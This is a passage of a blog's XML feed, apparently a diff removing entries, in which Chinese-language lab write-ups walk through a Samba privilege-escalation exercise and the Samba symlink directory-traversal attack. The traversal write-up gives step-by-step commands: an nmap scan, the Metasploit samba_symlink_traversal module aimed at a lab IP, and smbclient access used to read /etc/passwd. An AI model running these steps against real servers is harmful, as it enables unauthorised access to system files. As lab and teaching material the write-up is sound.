-<p>输入<code>whoami</code>查看权限，输入<code>ifconfig</code>，查看系统网络信息</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/samba%E6%8F%90%E6%9D%83/image-20211220190258566.png" alt="image-20211220190258566"></p>
-<p>实验完成</p>
-]]></content>
-      <tags>
-        <tag>samba 提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sysmlink漏洞</title>
-    <url>/2021/12/20/sysmlink%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<h2 id="sysmlink-目录遍历漏洞"><a href="#sysmlink-目录遍历漏洞" class="headerlink" title="sysmlink 目录遍历漏洞"></a>sysmlink 目录遍历漏洞</h2><h3 id="利用sysmlink漏洞读取目标主机的passwd文件内容"><a href="#利用sysmlink漏洞读取目标主机的passwd文件内容" class="headerlink" title="利用sysmlink漏洞读取目标主机的passwd文件内容"></a>利用sysmlink漏洞读取目标主机的passwd文件内容</h3><h4 id="原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。"><a href="#原理：Samba是一套实现SMB（server-messages-block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含-的目录遍历符的软连接-，可以进行目录遍历以及访问任意文件。" class="headerlink" title="原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。"></a>原理：Samba是一套实现SMB（server messages block）协议，跨平台进行文件共享和打印共享服务的程序，samba的sambd默认配置在可写文件共享时，存在目录遍历漏洞，远程用户可以通过smbclient端使用一个对称命，创建一个包含..的目录遍历符的软连接 ，可以进行目录遍历以及访问任意文件。</h4><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>使用<code>nmap -sV ip</code> 扫描主机，确认开放<code>445</code>，<code>139</code>端口且安装了<code>samba</code>服务，版本为3</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220165606561.png" alt="image-20211220165606561"></p>
-<p>命令行输入<code>search samba</code>，搜索samba的相关工具和载荷。</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173445099.png" alt="image-20211220173445099"></p>
-<p>终端中输入<code>use auxiliary/admin/smb/samba_symlink_traversal</code>，启用漏洞利用模块</p>
-<p>输入<code>info</code>，<code>&quot;yes&quot;</code>表示必须要填写的信息</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173527544.png" alt="image-20211220173527544"></p>
-<p>输入<code>set RHOST 192.168.1.3</code>和<code>set SMBSHARE tmp</code>，设置主机ip地址和SAM可写文件</p>
-<p>输入exploit开始攻击</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173602852.png" alt="image-20211220173602852"></p>
-<p>新建终端，输入<code>smbclient //192.168.1.3/tmp</code>，直接回车，无密码</p>
-<p>输入<code>cd rootfs</code>,进入rootfs目录，输入ls，列出目录</p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173635907.png" alt="image-20211220173635907"></p>
-<p>输入<code>more /etc/passwd</code></p>
-<p><img src="https://gitee.com/oxchang/img-host/raw/master/sysmlink%E6%BC%8F%E6%B4%9E/image-20211220173656794-16399930170041.png" alt="image-20211220173656794"></p>
-<p>此实验完成</p>
-]]></content>
-      <tags>
-        <tag>sysmlink msf</tag>
       </tags>
   </entry>
   <entry>
